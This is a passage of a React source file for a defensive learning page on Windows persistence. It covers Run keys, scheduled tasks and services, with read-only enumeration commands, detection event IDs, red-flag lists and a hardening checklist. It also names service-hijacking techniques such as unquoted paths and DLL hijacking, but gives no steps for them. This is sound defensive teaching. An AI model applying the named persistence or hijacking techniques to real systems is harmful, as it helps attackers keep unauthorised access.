      sources: "Sysmon 13, registry auditing, EDR baselines.",
    },
    {
      layer: "Task and service control",
      focus: "Task creation, service installs, and start changes.",
      sources: "4697, 4698, 7045, TaskScheduler logs.",
    },
    {
      layer: "Script and logon activity",
      focus: "Logon scripts, PowerShell, WMI, and GPO changes.",
      sources: "PowerShell logs, WMI logs, GPO auditing.",
    },
  ];

  const attckMappings = [
    { technique: "T1547", name: "Boot or Logon Autostart Execution", examples: "Run keys, Startup folder, Winlogon" },
    { technique: "T1053", name: "Scheduled Task/Job", examples: "Task Scheduler, at logon triggers" },
    { technique: "T1543", name: "Create or Modify System Process", examples: "Services and drivers" },
    { technique: "T1546", name: "Event Triggered Execution", examples: "WMI event subscriptions" },
    { technique: "T1574", name: "Hijack Execution Flow", examples: "DLL search order, AppInit_DLLs" },
  ];

  const triagePrompts = [
    "Who created the artifact and when was it first seen?",
    "Does the binary live in a user-writable location?",
    "Is the file signed and by a trusted publisher?",
    "Does the command line include encoded or obfuscated content?",
    "Is there a matching change ticket or maintenance window?",
  ];

  const pathRiskGuide = [
    { location: "%AppData% or %Temp%", risk: "High", note: "User-writable paths frequently abused." },
    { location: "C:\\ProgramData", risk: "Medium", note: "Shared location, verify ownership and provenance." },
    { location: "C:\\Program Files", risk: "Medium", note: "Validate publisher and install history." },
    { location: "C:\\Windows\\System32", risk: "Lower", note: "Still verify signatures and recent writes." },
    { location: "UNC or WebDAV paths", risk: "High", note: "Remote execution and staging risk." },
  ];

  const correlationIdeas = [
    "Task creation followed by a new process from a user-writable path.",
    "Run key added shortly after suspicious PowerShell activity.",
    "New service install paired with outbound network beaconing.",
    "WMI subscription creation outside admin change windows.",
    "Startup shortcut that points to a recently downloaded file.",
  ];

  const responseChecklist = [
    "Capture evidence: key, value, command line, hashes, and timestamps.",
    "Confirm legitimacy with asset owner or change management.",
    "Disable or remove the persistence entry safely.",
    "Remediate root cause (initial access vector).",
    "Hunt for related artifacts on similar hosts.",
  ];

  const labSuccessCriteria = [
    "Enumerate at least one artifact from three categories.",
    "Document path, signature, and creation time for each artifact.",
    "Flag one item as suspicious and justify the rationale.",
    "Propose one detection idea and one hardening step.",
  ];

  const stretchGoals = [
    "Baseline autoruns and compare results across two hosts.",
    "Correlate a task or service with process creation logs.",
    "Validate a suspicious binary with a hash lookup in a lab.",
  ];

  const evidenceChecklist = [
    "Full path to the binary or script",
    "Registry key and value name (if applicable)",
    "Task or service name and creation time",
    "Parent process and user account",
    "File hash and signature status",
  ];
  const hardeningChecklist = [
    "Enable process creation logging with command-line capture.",
    "Use application control (AppLocker or WDAC) for high-risk binaries.",
    "Review scheduled tasks and services for least privilege.",
    "Limit local admin usage and monitor privileged group changes.",
    "Harden PowerShell with constrained language where possible.",
  ];
  const eventIds = [
    "4688 - Process creation (Security log)",
    "4697 - Service installed (Security log)",
    "4698 - Scheduled task created (Security log)",
    "4699 - Scheduled task deleted (Security log)",
    "7045 - Service created (System log)",
    "13 - Registry value set (Sysmon)",
    "1 - Process creation (Sysmon)",
  ];
  const reportTemplate = `Host: <name>  Date: <utc>
Artifact type: <Run key / Task / Service / WMI>
Location: <path or registry key>
Value or name: <value>
Binary path: <path>
Signature: <signed/unsigned>
Observed by: <command used>
Why it matters: <risk or policy note>
Recommendation: <remove, restrict, allowlist, monitor>`;

  const muiTheme = useTheme();
  const isMobile = useMediaQuery(muiTheme.breakpoints.down("md"));
  const [navDrawerOpen, setNavDrawerOpen] = useState(false);
  const [activeSection, setActiveSection] = useState("intro");

  const scrollToSection = (sectionId: string) => {
    const element = document.getElementById(sectionId);
    if (element) {
      element.scrollIntoView({ behavior: "smooth", block: "start" });
      setActiveSection(sectionId);
      setNavDrawerOpen(false);
    }
  };

  useEffect(() => {
    const handleScroll = () => {
      const sections = sectionNavItems.map((item) => item.id);
      for (const sectionId of sections) {
        const element = document.getElementById(sectionId);
        if (element) {
          const rect = element.getBoundingClientRect();
          if (rect.top <= 150 && rect.bottom >= 150) {
            setActiveSection(sectionId);
            break;
          }
        }
      }
    };
    window.addEventListener("scroll", handleScroll);
    return () => window.removeEventListener("scroll", handleScroll);
  }, []);

  const progress = ((sectionNavItems.findIndex((item) => item.id === activeSection) + 1) / sectionNavItems.length) * 100;

  const sidebarNav = (
    <Box sx={{ p: 2 }}>
      <LinearProgress variant="determinate" value={progress} sx={{ mb: 2, height: 6, borderRadius: 3, bgcolor: alpha(theme.primary, 0.2), "& .MuiLinearProgress-bar": { bgcolor: theme.primary } }} />
      <List dense>
        {sectionNavItems.map((item) => (
          <ListItem
            key={item.id}
            component="div"
            onClick={() => scrollToSection(item.id)}
            sx={{
              borderRadius: 1,
              mb: 0.5,
              cursor: "pointer",
              bgcolor: activeSection === item.id ? alpha(theme.primary, 0.15) : "transparent",
              borderLeft: activeSection === item.id ? `3px solid ${theme.primary}` : "3px solid transparent",
              "&:hover": { bgcolor: alpha(theme.primary, 0.1) },
            }}
          >
            <ListItemIcon sx={{ minWidth: 36, color: activeSection === item.id ? theme.primary : "grey.500" }}>
              {item.icon}
            </ListItemIcon>
            <ListItemText primary={item.label} primaryTypographyProps={{ variant: "body2", sx: { color: activeSection === item.id ? theme.primary : "grey.400", fontWeight: activeSection === item.id ? 600 : 400 } }} />
          </ListItem>
        ))}
      </List>
    </Box>
  );

  return (
    <LearnPageLayout pageTitle="Windows Persistence Mechanisms" pageContext={pageContext}>
    <Box sx={{ minHeight: "100vh", bgcolor: theme.bgDark, py: 4 }}>
      <Container maxWidth="xl">
        <Grid container spacing={3}>
        {/* Sidebar Navigation */}
        <Grid item xs={12} md={2.5} sx={{ display: { xs: "none", md: "block" } }}>
          <Paper sx={{ position: "sticky", top: 80, bgcolor: theme.bgCard, borderRadius: 3, border: `1px solid ${theme.border}`, overflow: "hidden" }}>
            {sidebarNav}
          </Paper>
        </Grid>

        {/* Main Content */}
        <Grid item xs={12} md={9.5}>
        <Chip
          component={Link}
          to="/learn"
          icon={<ArrowBackIcon />}
          label="Back to Learning Hub"
          clickable
          variant="outlined"
          sx={{ borderRadius: 2, mb: 2 }}
        />

        {/* Section: Introduction */}
        <Box id="intro" sx={{ scrollMarginTop: 80 }}>
        <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 2 }}>
          <AutorenewIcon sx={{ fontSize: 42, color: theme.primary }} />
          <Typography
            variant="h3"
            sx={{
              fontWeight: 700,
              background: `linear-gradient(135deg, ${theme.primary} 0%, ${theme.primaryLight} 100%)`,
              backgroundClip: "text",
              WebkitBackgroundClip: "text",
              color: "transparent",
            }}
          >
            Windows Persistence Mechanisms
          </Typography>
        </Box>
        <Typography variant="h6" sx={{ color: "grey.400", mb: 2 }}>
          Persistence is how attackers make sure they can get back into a system after the first compromise.
        </Typography>

        {/* Why Persistence is Critical */}
        <Paper sx={{ p: 3, mb: 3, bgcolor: alpha(theme.primary, 0.03), borderRadius: 3, border: `1px solid ${alpha(theme.primary, 0.2)}` }}>
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: theme.primary }}>
            Why Persistence is the Attacker's Top Priority
          </Typography>
          <Typography variant="body2" paragraph sx={{ color: "grey.300" }}>
            In real-world breaches, initial access is often fleeting. An attacker might exploit a vulnerability, phish credentials, or
            leverage a misconfiguration to gain their first foothold. But that access is fragile—if the user logs off, the system reboots,
            or the vulnerability gets patched, the attacker loses their access completely. That's why persistence is so critical.
          </Typography>
          <Typography variant="body2" paragraph sx={{ color: "grey.300" }}>
            Persistence mechanisms allow attackers to survive these disruptions. By planting a scheduled task, modifying a registry Run key,
            or creating a Windows service, the attacker ensures their malware executes automatically after a reboot, user logon, or specific
            system event. This transforms a one-time breach into a long-term compromise, giving attackers time to escalate privileges,
            move laterally, exfiltrate data, and achieve their ultimate objectives.
          </Typography>
          <Typography variant="body2" sx={{ color: "grey.300" }}>
            The challenge for defenders is that Windows provides dozens of legitimate persistence mechanisms designed for system administration,
            software updates, and user convenience. Attackers abuse these same features, making malicious persistence blend in with normal
            system behavior. Understanding where these mechanisms exist and how to audit them is essential for detecting and removing
            attacker footholds before they can cause serious damage.
          </Typography>
        </Paper>

        {/* Real-World Impact */}
        <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#dc2626", 0.03), borderRadius: 2, border: `1px solid ${alpha("#dc2626", 0.2)}` }}>
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#dc2626" }}>
            Real-World Breach Examples: Persistence in Action
          </Typography>
          <Grid container spacing={2}>
            <Grid item xs={12} md={4}>
              <Paper sx={{ p: 2, bgcolor: alpha("#dc2626", 0.05), borderRadius: 2, height: "100%" }}>
                <Typography variant="subtitle2" sx={{ color: "#dc2626", fontWeight: 700, mb: 1 }}>
                  APT29 (Cozy Bear) - WMI Persistence
                </Typography>
                <Typography variant="body2" sx={{ color: "grey.300", fontSize: "0.85rem" }}>
                  Used WMI event subscriptions to maintain access in government networks. WMI persistence is fileless, stored in the
                  WMI repository, and extremely stealthy. Detection required specialized WMI monitoring tools.
                </Typography>
              </Paper>
            </Grid>
            <Grid item xs={12} md={4}>
              <Paper sx={{ p: 2, bgcolor: alpha("#f59e0b", 0.05), borderRadius: 2, height: "100%" }}>
                <Typography variant="subtitle2" sx={{ color: "#f59e0b", fontWeight: 700, mb: 1 }}>
                  Emotet - Run Keys & Services
                </Typography>
                <Typography variant="body2" sx={{ color: "grey.300", fontSize: "0.85rem" }}>
                  Banking trojan that persisted via HKCU Run keys and Windows services. Used randomized service names to evade
                  detection. Infected over 1.6 million computers worldwide before takedown in 2021.
                </Typography>
              </Paper>
            </Grid>
            <Grid item xs={12} md={4}>
              <Paper sx={{ p: 2, bgcolor: alpha("#8b5cf6", 0.05), borderRadius: 2, height: "100%" }}>
                <Typography variant="subtitle2" sx={{ color: "#8b5cf6", fontWeight: 700, mb: 1 }}>
                  SolarWinds - Scheduled Tasks
                </Typography>
                <Typography variant="body2" sx={{ color: "grey.300", fontSize: "0.85rem" }}>
                  SUNBURST backdoor used scheduled tasks disguised as legitimate software update checks. Persisted for months
                  in Fortune 500 companies and government agencies before discovery in December 2020.
                </Typography>
              </Paper>
            </Grid>
          </Grid>
        </Paper>

        {/* The Persistence Landscape */}
        <Paper sx={{ p: 3, mb: 3, bgcolor: theme.bgNested, borderRadius: 2 }}>
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: theme.primary }}>
            The Windows Persistence Landscape: Why So Many Techniques?
          </Typography>
          <Typography variant="body2" paragraph sx={{ color: "grey.300" }}>
            Windows has evolved over 30+ years, accumulating dozens of autostart mechanisms designed for different purposes.
            Some date back to Windows NT (like Run keys), while others are modern (like COM hijacking). This creates a vast
            attack surface that defenders must monitor.
          </Typography>
          <Grid container spacing={2}>
            <Grid item xs={12} md={6}>
              <Paper sx={{ p: 2, bgcolor: alpha(theme.primary, 0.05), borderRadius: 2 }}>
                <Typography variant="subtitle2" sx={{ color: theme.primary, fontWeight: 700, mb: 1 }}>
                  💡 Easy to Implement (Low Privilege)
                </Typography>
                <List dense>
                  {[
                    "HKCU Registry Run keys - No admin required",
                    "User Startup folder - Simple file drop",
                    "Scheduled tasks (user context) - Built-in tool",
                    "Shortcut hijacking - Modify .lnk files",
                  ].map((item) => (
                    <ListItem key={item} disableGutters sx={{ py: 0.25 }}>
                      <ListItemIcon sx={{ minWidth: 24 }}>
                        <CheckCircleIcon sx={{ fontSize: 14, color: theme.primary }} />
                      </ListItemIcon>
                      <ListItemText primary={item} primaryTypographyProps={{ variant: "body2", fontSize: "0.85rem" }} />
                    </ListItem>
                  ))}
                </List>
              </Paper>
            </Grid>
            <Grid item xs={12} md={6}>
              <Paper sx={{ p: 2, bgcolor: alpha("#dc2626", 0.05), borderRadius: 2 }}>
                <Typography variant="subtitle2" sx={{ color: "#dc2626", fontWeight: 700, mb: 1 }}>
                  🔒 Require Admin/SYSTEM Privileges
                </Typography>
                <List dense>
                  {[
                    "HKLM Registry Run keys - Affects all users",
                    "Windows Services - Starts before logon",
                    "Winlogon modifications - Controls logon process",
                    "LSA Security Packages - Deep system integration",
                  ].map((item) => (
                    <ListItem key={item} disableGutters sx={{ py: 0.25 }}>
                      <ListItemIcon sx={{ minWidth: 24 }}>
                        <WarningIcon sx={{ fontSize: 14, color: "#dc2626" }} />
                      </ListItemIcon>
                      <ListItemText primary={item} primaryTypographyProps={{ variant: "body2", fontSize: "0.85rem" }} />
                    </ListItem>
                  ))}
                </List>
              </Paper>
            </Grid>
          </Grid>
        </Paper>

        <Paper sx={{ p: 2.5, mb: 3, bgcolor: theme.bgNested, borderRadius: 2 }}>
          <Typography variant="body1" sx={{ color: "grey.300", mb: 1 }}>
            In simple terms, persistence means "staying put." If someone gains access to a Windows machine, they may
            add a task, service, or registry entry so their code runs again after reboot or logon. This page shows
            the common places those settings live and how to safely check them in a lab.
          </Typography>
          <Typography variant="body2" sx={{ color: "grey.400", mb: 1 }}>
            Think of persistence like leaving a key under the doormat. It is not always obvious, and sometimes it
            uses normal Windows features. Learning where those features are configured helps you spot risks quickly.
          </Typography>
          <Typography variant="body2" sx={{ color: "grey.400" }}>
            You will learn the main persistence locations, how to list them safely, and what signals to watch for.
            Everything here focuses on read-only inspection and documentation.
          </Typography>
        </Paper>
        <Box sx={{ display: "flex", gap: 1, flexWrap: "wrap", mb: 3 }}>
          <Chip icon={<SecurityIcon />} label="Registry" size="small" />
          <Chip icon={<StorageIcon />} label="Services" size="small" />
          <Chip icon={<SearchIcon />} label="Scheduled Tasks" size="small" />
          <Chip icon={<BuildIcon />} label="Detection" size="small" />
        </Box>
        </Box>

        {/* Section: Overview */}
        <Box id="overview" sx={{ mt: 4, scrollMarginTop: 80 }}>
          <Paper elevation={0} sx={{ bgcolor: theme.bgCard, borderRadius: 3, border: `1px solid ${theme.border}`, overflow: "hidden", p: 3 }}>
            <Box sx={{ mb: 3 }}>
              <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 1 }}>
                <SecurityIcon sx={{ color: theme.primary }} />
                <Typography variant="h5" sx={{ fontWeight: 700, background: `linear-gradient(135deg, ${theme.primary} 0%, ${theme.primaryLight} 100%)`, backgroundClip: "text", WebkitBackgroundClip: "text", color: "transparent" }}>
                  Overview
                </Typography>
              </Box>
              <Divider sx={{ mt: 2, borderColor: theme.border }} />
            </Box>

              <Paper sx={{ p: 2.5, mb: 3, bgcolor: theme.bgNested, borderRadius: 2 }}>
                <Typography variant="h6" sx={{ color: theme.primary, mb: 1 }}>
                  Learning Objectives
                </Typography>
                <List dense>
                  {objectives.map((item) => (
                    <ListItem key={item}>
                      <ListItemIcon>
                        <CheckCircleIcon color="info" fontSize="small" />
                      </ListItemIcon>
                      <ListItemText primary={item} sx={{ "& .MuiListItemText-primary": { color: "grey.300" } }} />
                    </ListItem>
                  ))}
                </List>
              </Paper>

              <Paper sx={{ p: 2.5, mb: 3, bgcolor: "#0c0f1c", borderRadius: 2 }}>
                <Typography variant="h6" sx={{ color: "#3b82f6", mb: 1 }}>
                  Beginner Path
                </Typography>
                <List dense>
                  {beginnerPath.map((item) => (
                    <ListItem key={item}>
                      <ListItemIcon>
                        <CheckCircleIcon color="info" fontSize="small" />
                      </ListItemIcon>
                      <ListItemText primary={item} sx={{ "& .MuiListItemText-primary": { color: "grey.300" } }} />
                    </ListItem>
                  ))}
                </List>
              </Paper>

              <Paper sx={{ p: 2.5, mb: 3, bgcolor: "#0c0f1c", borderRadius: 2 }}>
                <Typography variant="h6" sx={{ color: "#a5b4fc", mb: 1 }}>
                  Quick Glossary
                </Typography>
                <TableContainer>
                  <Table size="small">
                    <TableHead>
                      <TableRow>
                        <TableCell sx={{ color: "#a5b4fc" }}>Term</TableCell>
                        <TableCell sx={{ color: "#a5b4fc" }}>Meaning</TableCell>
                      </TableRow>
                    </TableHead>
                    <TableBody>
                      {glossary.map((item) => (
                        <TableRow key={item.term}>
                          <TableCell sx={{ color: "grey.200", fontWeight: 600 }}>{item.term}</TableCell>
                          <TableCell sx={{ color: "grey.400" }}>{item.desc}</TableCell>
                        </TableRow>
                      ))}
                  </TableBody>
                </Table>
              </TableContainer>
            </Paper>

              <Paper sx={{ p: 2.5, mb: 3, bgcolor: "#0c0f1c", borderRadius: 2 }}>
                <Typography variant="h6" sx={{ color: "#3b82f6", mb: 1 }}>
                  Common Misconceptions
                </Typography>
                <Grid container spacing={2}>
                  {misconceptions.map((item) => (
                    <Grid item xs={12} md={4} key={item.myth}>
                      <Paper
                        sx={{
                          p: 2,
                          bgcolor: "#0b1020",
                          borderRadius: 2,
                          border: "1px solid rgba(59,130,246,0.3)",
                          height: "100%",
                        }}
                      >
                        <Typography variant="subtitle2" sx={{ color: "#3b82f6", mb: 1 }}>
                          Myth
                        </Typography>
                        <Typography variant="body2" sx={{ color: "grey.300", mb: 1 }}>
                          {item.myth}
                        </Typography>
                        <Typography variant="subtitle2" sx={{ color: "#a5b4fc", mb: 0.5 }}>
                          Reality
                        </Typography>
                        <Typography variant="body2" sx={{ color: "grey.400" }}>
                          {item.reality}
                        </Typography>
                      </Paper>
                    </Grid>
                  ))}
                </Grid>
              </Paper>

              <Paper sx={{ p: 2.5, bgcolor: "#0c0f1c", borderRadius: 2 }}>
                <Typography variant="subtitle1" sx={{ color: "#a5b4fc", mb: 1 }}>
                  Why Persistence Matters
                </Typography>
                <List dense>
                  {[
                    "It lets attackers survive reboots and user logouts.",
                    "It is a common step after initial access.",
                    "It often relies on legitimate Windows features.",
                    "Detection depends on knowing where to look.",
                  ].map((item) => (
                    <ListItem key={item}>
                      <ListItemIcon>
                        <CheckCircleIcon color="success" fontSize="small" />
                      </ListItemIcon>
                      <ListItemText primary={item} sx={{ "& .MuiListItemText-primary": { color: "grey.300" } }} />
                    </ListItem>
                  ))}
                </List>
              </Paper>

              <Paper sx={{ p: 2.5, mb: 3, mt: 3, bgcolor: "#0c0f1c", borderRadius: 2 }}>
                <Typography variant="h6" sx={{ color: "#3b82f6", mb: 2 }}>
                  Persistence Lifecycle
                </Typography>
                <Grid container spacing={2}>
                  {persistenceLifecycle.map((item) => (
                    <Grid item xs={12} md={6} key={item.title}>
                      <Paper
                        sx={{
                          p: 2,
                          bgcolor: "#0b1020",
                          borderRadius: 2,
                          border: "1px solid rgba(59,130,246,0.3)",
                          height: "100%",
                        }}
                      >
                        <Typography variant="subtitle2" sx={{ color: "#e2e8f0", fontWeight: 600, mb: 0.5 }}>
                          {item.title}
                        </Typography>
                        <Typography variant="body2" sx={{ color: "grey.400", mb: 1 }}>
                          {item.desc}
                        </Typography>
                        <Typography variant="caption" sx={{ color: "grey.500" }}>
                          Example: {item.example}
                        </Typography>
                      </Paper>
                    </Grid>
                  ))}
                </Grid>
              </Paper>

              <Paper sx={{ p: 2.5, bgcolor: "#0c0f1c", borderRadius: 2 }}>
                <Typography variant="h6" sx={{ color: "#a5b4fc", mb: 1 }}>
                  Telemetry Layers to Monitor
                </Typography>
                <List dense>
                  {telemetryLayers.map((item) => (
                    <ListItem key={item.layer} sx={{ alignItems: "flex-start" }}>
                      <ListItemIcon sx={{ mt: 0.5 }}>
                        <CheckCircleIcon color="info" fontSize="small" />
                      </ListItemIcon>
                      <ListItemText
                        primary={item.layer}
                        secondary={`${item.focus} ${item.sources}`}
                        primaryTypographyProps={{ sx: { color: "grey.200", fontWeight: 600 } }}
                        secondaryTypographyProps={{ sx: { color: "grey.500" } }}
                      />
                    </ListItem>
                  ))}
                </List>
              </Paper>
          </Paper>
        </Box>

        {/* Section: Categories */}
        <Box id="categories" sx={{ mt: 4, scrollMarginTop: 80 }}>
          <Paper elevation={0} sx={{ bgcolor: theme.bgCard, borderRadius: 3, border: `1px solid ${theme.border}`, overflow: "hidden", p: 3 }}>
            <Box sx={{ mb: 3 }}>
              <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 1 }}>
                <StorageIcon sx={{ color: theme.secondary }} />
                <Typography variant="h5" sx={{ fontWeight: 700, background: `linear-gradient(135deg, ${theme.secondary} 0%, ${theme.primary} 100%)`, backgroundClip: "text", WebkitBackgroundClip: "text", color: "transparent" }}>
                  Categories
                </Typography>
              </Box>
              <Divider sx={{ mt: 2, borderColor: theme.border }} />
            </Box>

              {/* Deep Dive: Registry Run Keys */}
              <Paper sx={{ p: 3, mb: 3, bgcolor: alpha(theme.primary, 0.03), borderRadius: 2 }}>
                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: theme.primary }}>
                  1. Registry Run Keys: The Classic Persistence Method
                </Typography>
                <Typography variant="body2" paragraph sx={{ color: "grey.300" }}>
                  Registry Run keys are the most commonly abused persistence mechanism in Windows. First introduced in Windows 95, these registry
                  locations tell Windows which programs to execute automatically when a user logs in. While designed for legitimate software that
                  needs to start with the user session (like antivirus, cloud sync, system tray utilities), attackers love Run keys because they're
                  simple to use, require no special tools, and work on every version of Windows.
                </Typography>
                <Grid container spacing={2} sx={{ mb: 2 }}>
                  <Grid item xs={12} md={6}>
                    <Paper sx={{ p: 2, bgcolor: alpha("#3b82f6", 0.05), borderRadius: 2 }}>
                      <Typography variant="subtitle2" sx={{ color: "#3b82f6", fontWeight: 700, mb: 1 }}>
                        User-Level Run Keys (HKCU)
                      </Typography>
                      <Typography variant="body2" sx={{ color: "grey.300", fontSize: "0.85rem", mb: 1 }}>
                        <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>
                      </Typography>
                      <Typography variant="body2" sx={{ color: "grey.400", fontSize: "0.85rem" }}>
                        • No admin rights required to modify<br/>
                        • Executes only for the current user<br/>
                        • Most common for low-privilege malware<br/>
                        • Example: Emotet, Trickbot, ransomware droppers
                      </Typography>
                    </Paper>
                  </Grid>
                  <Grid item xs={12} md={6}>
                    <Paper sx={{ p: 2, bgcolor: alpha("#dc2626", 0.05), borderRadius: 2 }}>
                      <Typography variant="subtitle2" sx={{ color: "#dc2626", fontWeight: 700, mb: 1 }}>
                        System-Level Run Keys (HKLM)
                      </Typography>
                      <Typography variant="body2" sx={{ color: "grey.300", fontSize: "0.85rem", mb: 1 }}>
                        <code>HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>
                      </Typography>
                      <Typography variant="body2" sx={{ color: "grey.400", fontSize: "0.85rem" }}>
                        • Requires admin/SYSTEM privileges<br/>
                        • Executes for ALL users on the system<br/>
                        • Higher impact, easier to detect<br/>
                        • Example: Rootkits, advanced persistent threats
                      </Typography>
                    </Paper>
                  </Grid>
                </Grid>
                <Alert severity="warning" sx={{ mb: 2 }}>
                  <Typography variant="body2">
                    <strong>Detection Tip:</strong> Monitor for registry writes to Run/RunOnce keys using Sysmon Event ID 13 or Windows registry auditing.
                    Pay special attention to entries pointing to <code>%TEMP%</code>, <code>%APPDATA%</code>, or UNC paths—these are almost always malicious.
                  </Typography>
                </Alert>
                <CodeBlock language="powershell" code={`# Enumerate all Run keys (read-only)
reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
reg query "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
reg query "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"

# PowerShell alternative with more details
Get-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" |
  Select-Object PSChildName, *`} />
              </Paper>

              {/* Deep Dive: Scheduled Tasks */}
              <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#22c55e", 0.03), borderRadius: 2 }}>
                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#22c55e" }}>
                  2. Scheduled Tasks: Flexible and Powerful
                </Typography>
                <Typography variant="body2" paragraph sx={{ color: "grey.300" }}>
                  Windows Task Scheduler is a powerful automation framework that allows programs to run on schedules, at system events, or when
                  specific conditions are met. While essential for legitimate system administration (Windows Update, backups, maintenance), it's
                  also a favorite of attackers because tasks can run with SYSTEM privileges, trigger at boot (before user logon), and be hidden
                  from casual inspection.
                </Typography>
                <Grid container spacing={2} sx={{ mb: 2 }}>
                  <Grid item xs={12} md={4}>
                    <Paper sx={{ p: 2, bgcolor: alpha("#22c55e", 0.05), borderRadius: 2, height: "100%" }}>
                      <Typography variant="subtitle2" sx={{ color: "#22c55e", fontWeight: 700, mb: 1 }}>
                        🎯 Trigger Types
                      </Typography>
                      <List dense disablePadding>
                        {[
                          "At Logon - Runs when user signs in",
                          "At Startup - Runs at system boot",
                          "On Schedule - Daily, weekly, monthly",
                          "On Event - Windows event log trigger",
                          "On Idle - When system is inactive",
                        ].map((item) => (
                          <ListItem key={item} disableGutters sx={{ py: 0.25 }}>
                            <ListItemIcon sx={{ minWidth: 20 }}>
                              <CheckCircleIcon sx={{ fontSize: 12, color: "#22c55e" }} />
                            </ListItemIcon>
                            <ListItemText primary={item} primaryTypographyProps={{ variant: "caption" }} />
                          </ListItem>
                        ))}
                      </List>
                    </Paper>
                  </Grid>
                  <Grid item xs={12} md={4}>
                    <Paper sx={{ p: 2, bgcolor: alpha("#f59e0b", 0.05), borderRadius: 2, height: "100%" }}>
                      <Typography variant="subtitle2" sx={{ color: "#f59e0b", fontWeight: 700, mb: 1 }}>
                        ⚠️ Red Flags
                      </Typography>
                      <List dense disablePadding>
                        {[
                          "Task runs from %TEMP% or %APPDATA%",
                          "Created by non-admin user account",
                          "Randomized task name (e.g., A1B2C3D4)",
                          "Runs with SYSTEM but created recently",
                          "Action is PowerShell with -Encoded flag",
                        ].map((item) => (
                          <ListItem key={item} disableGutters sx={{ py: 0.25 }}>
                            <ListItemIcon sx={{ minWidth: 20 }}>
                              <WarningIcon sx={{ fontSize: 12, color: "#f59e0b" }} />
                            </ListItemIcon>
                            <ListItemText primary={item} primaryTypographyProps={{ variant: "caption" }} />
                          </ListItem>
                        ))}
                      </List>
                    </Paper>
                  </Grid>
                  <Grid item xs={12} md={4}>
                    <Paper sx={{ p: 2, bgcolor: alpha("#8b5cf6", 0.05), borderRadius: 2, height: "100%" }}>
                      <Typography variant="subtitle2" sx={{ color: "#8b5cf6", fontWeight: 700, mb: 1 }}>
                        🔍 Detection Events
                      </Typography>
                      <List dense disablePadding>
                        {[
                          "Security 4698 - Task created",
                          "Security 4699 - Task deleted",
                          "Security 4700 - Task enabled",
                          "Security 4702 - Task updated",
                          "System 106 - Task registered (TaskScheduler/Operational)",
                        ].map((item) => (
                          <ListItem key={item} disableGutters sx={{ py: 0.25 }}>
                            <ListItemIcon sx={{ minWidth: 20 }}>
                              <CheckCircleIcon sx={{ fontSize: 12, color: "#8b5cf6" }} />
                            </ListItemIcon>
                            <ListItemText primary={item} primaryTypographyProps={{ variant: "caption" }} />
                          </ListItem>
                        ))}
                      </List>
                    </Paper>
                  </Grid>
                </Grid>
                <CodeBlock language="powershell" code={`# List all scheduled tasks with details
Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"} |
  Select-Object TaskName, TaskPath, State, @{N="Author";E={$_.Principal.UserId}},
    @{N="RunLevel";E={$_.Principal.RunLevel}} | Format-Table -AutoSize

# Check task actions (what the task actually does)
Get-ScheduledTask | ForEach-Object {
  [PSCustomObject]@{
    Name = $_.TaskName
    Action = $_.Actions.Execute
    Arguments = $_.Actions.Arguments
    WorkingDir = $_.Actions.WorkingDirectory
  }
} | Where-Object {$_.Action -like "*powershell*" -or $_.Action -like "*cmd*"}`} />
              </Paper>

              {/* Deep Dive: Windows Services */}
              <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#dc2626", 0.03), borderRadius: 2 }}>
                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#dc2626" }}>
                  3. Windows Services: The Stealthiest Persistence
                </Typography>
                <Typography variant="body2" paragraph sx={{ color: "grey.300" }}>
                  Windows Services are programs that run in the background, often starting before any user logs in and continuing to run until
                  shutdown. They're managed by the Service Control Manager (SCM) and typically run with SYSTEM privileges. This makes them
                  incredibly powerful for persistence—a malicious service starts automatically at boot, runs with the highest privileges, and
                  doesn't depend on any user being logged in.
                </Typography>
                <Typography variant="body2" paragraph sx={{ color: "grey.300" }}>
                  The challenge is that Windows systems run dozens of legitimate services, making it easy for attackers to hide malicious ones
                  among the noise. Advanced attackers often mimic legitimate service names (e.g., "WinDefenderUpdate" instead of "WinDefend") or
                  even hijack existing stopped services by replacing their binary paths.
                </Typography>
                <Grid container spacing={2} sx={{ mb: 2 }}>
                  <Grid item xs={12} md={6}>
                    <Paper sx={{ p: 2, bgcolor: alpha("#dc2626", 0.05), borderRadius: 2 }}>
                      <Typography variant="subtitle2" sx={{ color: "#dc2626", fontWeight: 700, mb: 1 }}>
                        Why Attackers Love Services
                      </Typography>
                      <Typography variant="body2" sx={{ color: "grey.300", fontSize: "0.85rem" }}>
                        • Starts before user logon (pre-login persistence)<br/>
                        • Runs as SYSTEM (highest local privilege)<br/>
                        • Survives user logoff and account deletion<br/>
                        • Can be set to auto-restart on failure<br/>
                        • Difficult to spot among legitimate services<br/>
                        • Example: TrickBot, Ryuk, SolarWinds SUNBURST
                      </Typography>
                    </Paper>
                  </Grid>
                  <Grid item xs={12} md={6}>
                    <Paper sx={{ p: 2, bgcolor: alpha("#f59e0b", 0.05), borderRadius: 2 }}>
                      <Typography variant="subtitle2" sx={{ color: "#f59e0b", fontWeight: 700, mb: 1 }}>
                        Service Hijacking Techniques
                      </Typography>
                      <Typography variant="body2" sx={{ color: "grey.300", fontSize: "0.85rem" }}>
                        • <strong>Unquoted Service Paths:</strong> Exploit spaces in paths without quotes<br/>
                        • <strong>Weak Permissions:</strong> Replace service binary if writable<br/>
                        • <strong>DLL Hijacking:</strong> Place malicious DLL in service directory<br/>
                        • <strong>Service Creation:</strong> Create entirely new service<br/>
                        • <strong>Modify Existing:</strong> Change ImagePath of disabled service
                      </Typography>
